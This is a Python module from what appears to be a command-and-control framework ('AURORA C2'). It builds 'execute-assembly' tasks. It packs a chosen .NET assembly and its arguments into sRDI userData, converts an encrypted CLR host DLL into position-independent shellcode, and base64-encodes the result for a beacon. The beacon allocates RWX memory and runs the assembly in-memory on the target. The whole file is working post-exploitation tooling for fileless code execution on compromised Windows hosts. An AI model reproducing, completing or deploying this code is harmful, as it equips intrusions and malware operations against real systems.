"""
AURORA C2 - .NET assembly preparation for execute-assembly task.

Uses sRDI to convert a pre-compiled native CLR host DLL (clr_loader.dll)
into position-independent shellcode. The .NET assembly bytes and
command-line arguments are passed as sRDI userData; no C# bootstrap DLL is
required.

The beacon receives the resulting shellcode, allocates RWX memory, and
creates a thread.  The sRDI loader maps clr_loader.dll, resolves imports,
calls DllMain, then calls the AssemblyExec export (identified by its
sRDI hash).  AssemblyExec initializes the CLR and runs the .NET assembly
in-memory.

Blob format sent to beacon:
    base64( [4-byte: pipe_handle_patch_offset] [sRDI_shellcode] )

sRDI userData layout (all little-endian):
    [8-byte: reserved]                              (legacy pipe slot, ignored)
    [4-byte: asm_len]       [assembly bytes]         (.NET EXE)
    [4-byte: args_len]      [args string]            (UTF-8)
"""
from __future__ import annotations

import base64
import struct
import sys
from pathlib import Path

# Add sRDI module to path
_SRDI_DIR = Path(__file__).resolve().parent / "srdi"
if str(_SRDI_DIR) not in sys.path:
    sys.path.insert(0, str(_SRDI_DIR))

from ShellcodeRDI import ConvertToShellcode, HashFunctionName, is64BitDLL  # noqa: E402

from resource_manager import has_resource, load_resource  # noqa: E402

# Assets directory (pre-compiled DLLs) — now loaded from encrypted resources/
# _CLR_LOADER_DLL = _ASSETS_DIR / "clr_loader.dll"
_CLR_LOADER_RESOURCE = "clr_loader"

# sRDI export function name in clr_loader.dll
_EXPORT_NAME = "AssemblyExec"

# Size limits
# The beacon's MAX_HTTP_RESP is 2 MB. After double base64 (shellcode → task args
# → AES ciphertext → base64 → JSON), the effective limit for the raw .NET
# assembly is roughly 1 MB. Increase MAX_HTTP_RESP in config.h for larger tools.
_MAX_ASSEMBLY_SIZE = 1024 * 1024  # 1 MB
_MAX_ARGS_SIZE = 8192


class AssemblyParseError(Exception):
    pass


def _resolve_path(raw_path: str) -> Path:
    if not raw_path or "\x00" in raw_path:
        raise AssemblyParseError("Invalid assembly path")
    p = Path(raw_path).expanduser()
    if not p.is_absolute():
        p = Path.cwd() / p
    return p.resolve()


def _split_args(args: str) -> list[str]:
    """Split args respecting double quotes (same logic as dll_parser)."""
    tokens: list[str] = []
    buf: list[str] = []
    quote: str | None = None
    for ch in args.strip():
        if quote:
            if ch == quote:
                quote = None
            else:
                buf.append(ch)
            continue
        if ch in ('"', "'"):
            quote = ch
            continue
        if ch.isspace():
            if buf:
                tokens.append("".join(buf))
                buf = []
            continue
        buf.append(ch)
    if quote:
        raise AssemblyParseError("Unclosed quote in arguments")
    if buf:
        tokens.append("".join(buf))
    return tokens


def _check_assets() -> None:
    """Verify that the encrypted CLR host resource exists."""
    if not has_resource(_CLR_LOADER_RESOURCE):
        raise AssemblyParseError(
            f"Encrypted CLR host not found in resources/{_CLR_LOADER_RESOURCE}.enc\n"
            f"Build/encrypt it: cd test/assets && make clr_loader.dll && "
            f"python ../../teamserver/encrypt_resources.py encrypt {_CLR_LOADER_RESOURCE} clr_loader.dll"
        )


def prepare_execute_assembly_task(args: str) -> tuple[str, str, dict[str, str | int]]:
    """Prepare an execute-assembly task.

    Args:
        args: "<assembly_path> [arguments...]"

    Returns:
        (task_args, display_args, meta) where task_args is base64 shellcode.
    """
    _check_assets()

    parts = _split_args(args or "")
    if not parts:
        raise AssemblyParseError("Usage: execute-assembly <assembly_path> [args...]")

    asm_path = _resolve_path(parts[0])
    if not asm_path.is_file():
        raise AssemblyParseError(f"Assembly file not found: {parts[0]}")

    raw_asm = asm_path.read_bytes()
    if len(raw_asm) > _MAX_ASSEMBLY_SIZE:
        raise AssemblyParseError(
            f"Assembly file exceeds {_MAX_ASSEMBLY_SIZE // 1024} KB limit "
            f"(increase MAX_HTTP_RESP in config.h for larger tools)"
        )

    # Verify it's a PE file (.NET assemblies are valid PE)
    if len(raw_asm) < 2 or raw_asm[:2] != b"MZ":
        raise AssemblyParseError("File is not a valid PE/.NET assembly (missing MZ header)")
    if not is64BitDLL(raw_asm):
        raise AssemblyParseError(
            "Assembly is not 64-bit (x64). execute-assembly runs inside a 64-bit "
            "CLR host, so compile the .NET assembly with -platform:x64."
        )

    # Remaining tokens = arguments for the .NET assembly
    asm_args = " ".join(parts[1:]) if len(parts) > 1 else ""
    if len(asm_args.encode("utf-8")) > _MAX_ARGS_SIZE:
        raise AssemblyParseError(f"Arguments exceed {_MAX_ARGS_SIZE} bytes")

    # Read pre-compiled native CLR host from encrypted resources
    clr_loader_dll = load_resource(_CLR_LOADER_RESOURCE)

    # Verify embedded loader asset is 64-bit
    if not is64BitDLL(clr_loader_dll):
        raise AssemblyParseError("clr_loader.dll is not 64-bit (beacon is x64)")

    # Build sRDI userData:
    #   [8-byte: reserved]      [legacy pipe slot, ignored by clr_loader]
    #   [4-byte: asm_len]       [assembly bytes]
    #   [4-byte: args_len]      [args string]
    args_bytes = asm_args.encode("utf-8")
    user_data = bytearray()
    user_data += struct.pack("<Q", 0)  # reserved legacy pipe slot
    user_data += struct.pack("<I", len(raw_asm))
    user_data += raw_asm
    user_data += struct.pack("<I", len(args_bytes))
    user_data += args_bytes

    # sRDI: convert clr_loader.dll to shellcode with our userData
    function_hash = HashFunctionName(_EXPORT_NAME)
    flags = 0
    shellcode = ConvertToShellcode(clr_loader_dll, function_hash, bytes(user_data), flags)
    if not shellcode:
        raise AssemblyParseError("sRDI conversion failed")

    # Keep the legacy patch offset for beacon compatibility. The current
    # clr_loader ignores this reserved slot and stays silent; assembly stdout
    # is captured through the sacrificial process' inherited std handles.
    pipe_handle_patch_offset = len(shellcode) - len(user_data)

    blob = struct.pack("<I", pipe_handle_patch_offset) + shellcode
    b64 = base64.b64encode(blob).decode("ascii")

    display = parts[0]
    if asm_args:
        display += " " + asm_args

    meta = {
        "assembly_path": parts[0],
        "assembly_size": len(raw_asm),
        "args": asm_args,
        "shellcode_size": len(shellcode),
        "user_data_size": len(user_data),
        "pipe_handle_patch_offset": pipe_handle_patch_offset,
    }
    return b64, display, meta
